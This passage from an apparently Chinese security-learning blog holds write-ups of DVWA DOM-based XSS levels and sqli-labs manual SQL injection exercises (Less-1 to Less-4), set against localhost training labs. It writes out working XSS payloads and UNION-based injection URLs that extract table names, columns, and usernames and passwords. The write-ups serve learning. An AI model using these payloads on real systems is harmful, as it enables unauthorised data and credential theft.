onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure><p><mark>【尚未解决】</mark>这里有个疑问，查看源码也不知为什么可能是版本的问题吧很懵逼就是当我输出的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/xss_d/default=English &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>但是经过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) </span><br><span class="line">&#123;</span><br><span class="line">    var lang =document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">    document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&quot; + lang + &quot;&#x27;</span>&gt;</span>&quot; + decodeURI(lang) + &quot;<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">    document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码后，其中的<code>decodeURI</code>函数的部分输出到页面后只有<code>English  </code></p><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><p>试了下Medium的payload，发现被重定向了，估计是将过滤丰富了一下，看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"><span class="comment"># White list the allowable languages</span></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line"><span class="comment"># ok</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​    使用了白名单模式，如果 <code>default</code> 的值不为规定值的话就重定向URL 为:<code>?default=English</code> ，这样的话就肯定不能利用default了，这里我们自己新建一个变量进行注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.48xmqbqb8ye0.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?default=English&amp;a=&lt;input onclick=alert(&#x27;XSS&#x27;) /&gt;</span><br><span class="line">?default=English#&lt;input onclick=alert(&#x27;XSS&#x27;) /&gt;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230709/St2iv8rimage.2a3pj049h2as.png"></p><p>不知道为什么之前的&lt;input这样处理后又可以了。</p><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><p>后端：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protection handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前端：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vulnerable_code_area&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&quot; + lang + &quot;&#x27;</span>&gt;</span>&quot; + (lang) + &quot;<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里发生了变化：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>没有跟我们输出的东西解码，识别不出来这样会导致标签失效，从而无法进行XSS。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVMA靶场学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab(手工注入篇)</title>
      <link href="/2023/07/05/sqli-lab-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2023/07/05/sqli-lab-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>狠狠地给我注入💉</p></blockquote><span id="more"></span><blockquote><p>本质就是学SQL😭</p></blockquote><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><blockquote><p>GET - Error based - Single quotes - String</p></blockquote><h2 id="一、题目环境"><a href="#一、题目环境" class="headerlink" title="一、题目环境"></a>一、题目环境</h2><p>打开靶场Level1如图所示：<br><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA1.png"></p><h2 id="二、判断是否存在SQL注入"><a href="#二、判断是否存在SQL注入" class="headerlink" title="二、判断是否存在SQL注入"></a>二、判断是否存在SQL注入</h2><blockquote><p>Please input the ID as parameter with numeric value.</p></blockquote><p>由题目的提醒，我们试着输入手动输入id来观察页面是否有回显来判断是否存在SQL注入漏洞。</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA2.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA3.png"></p><p>通过输入不同的id值，我们发现页面有了回显并且返回的内容也不相同，这说明存在我们刚才输入的内容是代入数据库中去执行查询命令了。即此页面存在SQL注入漏洞。</p><h2 id="三、判断类型"><a href="#三、判断类型" class="headerlink" title="三、判断类型"></a>三、判断类型</h2><ul><li>根据参数类型：字符型，数字型、搜索型</li><li>根据提交方式：POST注入，GET注入，HTTP HEAD注入</li><li>根据有无回显：联合注入，报错注入，布尔盲注，延时注入</li><li>其他注入：堆叠注入，宽字节注入，二次注入等</li></ul><p>在这里由于是level1且初学，我们仅考虑参数类型中的字符型和数字型。</p><h3 id="1-判断漏洞类型是否是数字型"><a href="#1-判断漏洞类型是否是数字型" class="headerlink" title="1.判断漏洞类型是否是数字型"></a>1.判断漏洞类型是否是数字型</h3><blockquote><p>当输入的参数为整型时，SQL语句类型大致如下：<br>select * from &lt;表名&gt; where id = x<br>这种类型可以使用 <strong>and 1=1</strong> 和 <strong>and 1=2</strong> 来进行判断：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> 页面依旧运行正常，继续进行下一步。</span><br><span class="line"></span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> 页面运行错误，则说明此<span class="keyword">SQL</span>注入为数字型注入。若页面依旧运行正常，则漏洞类型不是数字型</span><br><span class="line"></span><br><span class="line">在后台执行的<span class="keyword">SQL</span>语句大致如下:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA4.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA5.png"></p><p>根据回显可得，该SQL注入漏洞不是数字型。</p><h3 id="2-判断漏洞类型是否是字符型"><a href="#2-判断漏洞类型是否是字符型" class="headerlink" title="2.判断漏洞类型是否是字符型"></a>2.判断漏洞类型是否是字符型</h3><blockquote><p>当输入的参数为字符型时，SQL 语句类型大致如下：<br>select * from &lt;表名&gt; where id = ‘x’<br>这种类型我们同样可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> 页面运行正常，继续进行下一步。</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span> 页面运行错误，则说明此 <span class="keyword">Sql</span> 注入为字符型注入。</span><br><span class="line"></span><br><span class="line">可以简化成：</span><br><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span> x<span class="string">&#x27; and 1=1 --+页面运行正常，继续进行下一步。</span></span><br><span class="line"><span class="string">url/?id= x&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+ 页面运行错误，则说明此 Sql 注入为字符型注入。</span></span><br><span class="line">在后台执行的<span class="keyword">SQL</span>语句大致如下:</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA7.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA8.png"></p><p>根据回显可得, 该SQL注入漏洞是字符型.</p><h2 id="四、开始注入"><a href="#四、开始注入" class="headerlink" title="四、开始注入"></a>四、开始注入</h2><p>由于靶场不支持#号的注释方法,我们采用–+的注释方法.</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA6.png"></p><h3 id="1-获取表格有几列"><a href="#1-获取表格有几列" class="headerlink" title="1.获取表格有几列"></a>1.获取表格有几列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure><p>这个只有从1~n挨个去试,有时候运气好可能试的次数少一点.</p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA9.png"></p><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA10.png"></p><p>所以,这个表格由三列组成.</p><blockquote><p><strong>order by语法：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 数字 <span class="operator">|</span> 列名 [ <span class="keyword">ASC</span> , [ <span class="keyword">DESC</span> ] ]</span><br></pre></td></tr></table></figure><p>1、order by：对查询结果按照指定列进行排序，指定列的方式有两种：数字或列名</p><p>2、ASC：升序排列，默认为ASC</p><p>3、DESC：降序排列</p><p> 注意：<strong>以数字方式指定排序列时，数字不能超过列的总数</strong>，利用该特性在进行SQL注入的时候可以判断数据库的字段数量</p></blockquote><h3 id="2-爆出显示位"><a href="#2-爆出显示位" class="headerlink" title="2.爆出显示位"></a>2.爆出显示位</h3><blockquote><p>显示位就是网页中能够显示数据的位置。</p><p>举例来说，比如我们通过order by命令知道了表的列数为11。然后再使用union select 1,2,3…,11 from table，网页中显示了信息8，那么说明网页只能够显示第8列中信息，不能显示其他列的信息。也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。所以如果我们想要知道某个属性的值，比如admin,就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><blockquote><p><strong>为什么这里要给id赋值为-1呢?</strong></p><p>如果id=1的数据被查询出来，返回到页面中，就占据了两个回显位,导致后续的查询的内容无法回显到页面中,所以就是专门不让id正确从而能够让后续查询语句能够正常回显.</p></blockquote><h3 id="3-爆出库名和版本或操作系统和用户名"><a href="#3-爆出库名和版本或操作系统和用户名" class="headerlink" title="3.爆出库名和版本或操作系统和用户名"></a>3.爆出库名和版本或操作系统和用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,database(),version()--+</span></span><br><span class="line"><span class="string">url/?id=-1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,@<span class="variable">@version</span>_compile_os,<span class="keyword">user</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="%E9%9D%B6%E5%9C%BA11.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.1n2ch975ei80.webp"></p><blockquote><p>database(),version()都是sql中的函数.</p><p>这里将2,3换为database()和version()是因为2,3才是显示位.</p></blockquote><h3 id="4-爆出表名"><a href="#4-爆出表名" class="headerlink" title="4.爆出表名"></a>4.爆出表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.b0j47d12sjk.webp"></p><p><strong>1.group_concat函数</strong></p><p> ​    group_concat函数是将查询到的每行结果以某个字段名进行合并，每一行合并的结果以逗号分隔开，如果逗号看不清楚的话，可以自定义分隔符如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(table_name,&#x27;我是分隔符&#x27;)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.27orjr0g48ow.webp"></p><p> <strong>2.information_schema数据库</strong></p><p> ​    information_schema是mysql自带的一个信息数据库，保存着关于MySQL服务器所维护的所有其他数据库的信息。在information_schema数据库中还可以利用的表如下：</p><table><thead><tr><th align="center">schema_name</th><th align="center">储存了所有数据库的库名</th></tr></thead><tbody><tr><td align="center"><strong>table_schema</strong></td><td align="center"><strong>储存了数据库名</strong></td></tr><tr><td align="center"><strong>tables</strong></td><td align="center"><strong>储存了数据库库名，以及该库中包含的表名</strong></td></tr><tr><td align="center"><strong>table_name</strong></td><td align="center"><strong>储存了表名</strong></td></tr></tbody></table><h3 id="5-爆出字段内容"><a href="#5-爆出字段内容" class="headerlink" title="5.爆出字段内容"></a>5.爆出字段内容</h3><blockquote><p>由于在爆表时候我们发现了关键表‘users’，于是我们现在去查一查它其中的字段</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.3qemwe8cioxs.webp"></p><p>发现了关键字段，现在我们来爆出字段的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span><span class="comment">--&#x27;),group_concat(password,&#x27;--&#x27;) from users--+</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230111/%E5%9B%BE%E7%89%87.537toufrxm9s.webp"></p><p>成功获取关键数据。</p><h2 id="五、后记"><a href="#五、后记" class="headerlink" title="五、后记"></a>五、后记</h2><p>​    这道题虽然不难但是花了我挺多的时间，很大部分是我对数据库太不熟悉了：表、行、列、字段之间的关系等等，下面放一些资料吧：</p><ol><li><a class="link" href="https://blog.csdn.net/m0_63550462/article/details/121206926?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%92%8C%E5%88%97&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-121206926.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">表、列、行、注解等讲解<i class="fas fa-external-link-alt"></i></a></li><li>数据库字段是是什么？每个字段由若干按照某种界限划分的相同数据类型的数据项组成.通常在表中为“列”</li><li><a class="link" href="https://blog.csdn.net/qq_44159028/article/details/114325805?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167339772016800217031196%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167339772016800217031196&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-114325805-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">SQL注入详解<i class="fas fa-external-link-alt"></i></a></li></ol><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><blockquote><p>GET - Error based - Intiger based</p></blockquote><p>​    同Less-1,只不过是数字型SQL注入，少了引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 </span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()</span><br><span class="line">--+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;</span><br><span class="line">--+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-2/</span><br><span class="line">?id=-1 union select 1,group_concat(username,&quot;--&quot;),group_concat(password,&quot;--&quot;) from users</span><br><span class="line">--+</span><br></pre></td></tr></table></figure><p><strong>小Tips</strong>：可以在本地用navicat连接好我们要查询的数据库，然后觉得抽象的部分就拿着本地的数据库中的结构去写SQL语句。</p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><blockquote><p>GET - Error based - Single quotes with twist –string</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">http://localhost/SQLlabs/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">--------------------判断为字符型注入--------------------</span><br></pre></td></tr></table></figure><p>继续注入我们发现，Less-1的方法会报错，查看php源码发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>由于将注入的部分用了括号整体括起来，我们现在要实现注入的话就得更改一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;$id&#x27;)</span><br><span class="line">--------------------假设注入如下--------------------</span><br><span class="line">?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&#x27;-1&#x27; union select 1,database(),version() --+&#x27;)</span><br><span class="line">//这样就会存在括号缺失，我们提前结束括号就能注入成功</span><br><span class="line">--------------------应当注入如下--------------------</span><br><span class="line">?id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">--------------------得到结果如下--------------------</span><br><span class="line">(&#x27;-1&#x27;) union select 1,database(),version() --+&#x27;)</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------查表--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">--------------------查表字段/属性--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line">--------------------查表字段/属性的内容--------------------</span><br><span class="line">http://localhost/SQLlabs/Less-3/</span><br><span class="line">?id=-1&#x27;) union select 1,group_concat(username,&#x27;--&#x27;),group_concat(password,&#x27;--&#x27;) from users --+</span><br></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><blockquote><p>Less-4 Error Based- DoubleQuotes String</p></blockquote><p>有点奇怪，字符型和数字型都测了一遍，但是发现页面都有正确回显。注释语句也没起到作用，看看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span 